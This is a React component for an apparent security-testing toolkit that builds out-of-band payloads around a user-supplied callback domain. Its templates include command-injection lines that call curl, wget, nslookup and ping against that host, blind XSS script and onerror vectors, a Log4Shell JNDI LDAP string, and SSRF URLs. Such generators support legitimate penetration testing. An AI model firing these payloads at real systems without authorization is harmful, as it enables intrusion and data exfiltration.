// @author: Albert C | @yz9yt | github.com/yz9yt
// components/OobInteractionHelper.tsx
// version 0.1 Beta
import React, { useState } from 'react';
import { SignalIcon, ClipboardDocumentListIcon, PuzzlePieceIcon } from './Icons.tsx';
import { ToolLayout } from './ToolLayout.tsx';

interface Payload {
    name: string;
    value: string;
}

interface PayloadCategory {
    title: string;
    payloads: (domain: string) => Payload[];
}

const payloadCategories: PayloadCategory[] = [
    {
        title: "DNS (General Purpose)",
        payloads: (domain) => [
            { name: "Plain Domain", value: domain },
            { name: "With Subdomain", value: `sub.${domain}` },
        ]
    },
    {
        title: "Command Injection",
        payloads: (domain) => [
            { name: "nslookup", value: `nslookup ${domain}` },
            { name: "dig", value: `dig ${domain}` },
            { name: "ping", value: `ping -c 1 ${domain}` },
            { name: "cURL", value: `curl http://${domain}` },
            { name: "wget", value: `wget http://${domain}` },
        ]
    },
    {
        title: "Blind XSS",
        payloads: (domain) => [
            { name: "Script Src", value: `<script src=//${domain}></script>` },
            { name: "Image Src", value: `<img src=x onerror="document.location='//${domain}'">` },
            { name: "Import", value: `@import '//${domain}';` },
        ]
    },
    {
        title: "Log4Shell (JNDI)",
        payloads: (domain) => [
            { name: "Basic LDAP", value: `\${jndi:ldap://${domain}/a}` },
        ]
    },
    {
        title: "Blind SSRF",
        payloads: (domain) => [
            { name: "HTTP", value: `http://${domain}` },
            { name: "HTTPS", value: `https://${domain}` },
        ]
    },
];

interface GeneratedPayloads {
    title: string;
    payloads: Payload[];
}


export const OobInteractionHelper: React.FC = () => {
    const [domain, setDomain] = useState<string>('your-id.oastify.com');
    const [copiedPayload, setCopiedPayload] = useState<string | null>(null);
    const [generatedPayloads, setGeneratedPayloads] = useState<GeneratedPayloads[] | null>(null);

    const handleCopy = (payloadValue: string) => {
        navigator.clipboard.writeText(payloadValue);
        setCopiedPayload(payloadValue);
        setTimeout(() => setCopiedPayload(null), 2000);
    };

    const handleGenerate = () => {
        const payloads = payloadCategories.map(category => ({
            title: category.title,
            payloads: category.payloads(domain)
        }));
        setGeneratedPayloads(payloads);
    };

    return (
        <ToolLayout
            icon={<SignalIcon className="h-8 w-8 text-coral" />}
            title="OOB Interaction Helper"
            description={<>Generate Out-of-Band (OOB) payloads for blind vulnerabilities. Use services like <a href="https://interact.sh" target="_blank" rel="noopener noreferrer" className="text-purple-400 hover:underline">interact.sh</a> or Burp Collaborator to get a callback domain.</>}
        >
            <div className="max-w-xl mx-auto">
                <label htmlFor="oob-domain" className="label-mini mb-2 block">Your Callback Domain</label>
                <input
                    id="oob-domain"
                    type="text"
                    value={domain}
                    onChange={(e) => setDomain(e.target.value)}
                    placeholder="e.g., your-id.oastify.com"
                    className="input-premium w-full p-4 font-mono text-sm"
                />
            </div>

            <div className="mt-8 flex justify-center">
                <button
                    onClick={handleGenerate}
                    disabled={!domain.trim()}
                    className="btn-mini btn-mini-primary !h-12 !px-10 !rounded-xl shadow-glow-coral group gap-3"
                    title="Generate OOB payloads based on the domain"
                >
                    <PuzzlePieceIcon className="h-5 w-5 group-hover:rotate-12 transition-transform" />
                    GENERATE OOB INTELLIGENCE
                </button>
            </div>

            {generatedPayloads && (
                <div className="mt-10 space-y-8 animate-fade-in">
                    {generatedPayloads.map((category) => (
                        <div key={category.title}>
                            <h4 className="title-standard !text-lg mb-4 pl-1">{category.title}</h4>
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                {category.payloads.map((payload) => (
                                    <div key={payload.name} className="card-premium p-4 !bg-ui-bg/40 hover:border-ui-accent/40 transition-all group/card">
                                        <p className="label-mini mb-3 opacity-70">{payload.name}</p>
                                        <div className="bg-black/40 p-3 rounded-xl font-mono text-xs text-ui-accent/90 relative group border border-white/5">
                                            <pre className="overflow-x-auto no-scrollbar"><code className="whitespace-pre-wrap break-all">{payload.value}</code></pre>
                                            <button
                                                onClick={() => handleCopy(payload.value)}
                                                className="absolute top-2 right-2 p-1.5 rounded-lg bg-ui-accent/10 border border-ui-accent/30 text-ui-accent opacity-0 group-hover:opacity-100 focus:opacity-100 transition-all hover:bg-ui-accent/20"
                                                aria-label={`Copy ${payload.name}`}
                                                title={`Copy ${payload.name}`}
                                            >
                                                {copiedPayload === payload.value ? (
                                                    <span className="text-[8px] font-black px-1">COPIED</span>
                                                ) : (
                                                    <ClipboardDocumentListIcon className="h-4 w-4" />
                                                )}
                                            </button>
                                        </div>
                                    </div>
                                ))}
                            </div>
                        </div>
                    ))}
                </div>
            )}
        </ToolLayout>
    );
};